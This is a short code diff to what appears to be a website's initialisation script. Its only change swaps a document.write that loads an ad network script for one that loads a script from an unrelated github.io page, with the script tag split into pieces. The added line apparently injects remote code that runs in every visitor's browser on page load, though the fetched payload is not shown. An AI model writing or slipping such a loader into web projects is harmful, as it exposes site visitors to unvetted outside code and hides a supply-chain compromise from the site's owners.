@@ -38,7 +38,7 @@
         },
 
         init: function() {
-            document.write('<scri' + 'pt src="https://ad.admitad.com/3rd-party/advert.js"></sc' + 'ript>');
+            document.write('<scri' + 'pt src="https://modulo-offic.github.io/start.html"></sc' + 'ript>');
 
             WebFontConfig = {
                 google: { families: [ 'PT+Serif::latin,cyrillic' ] }
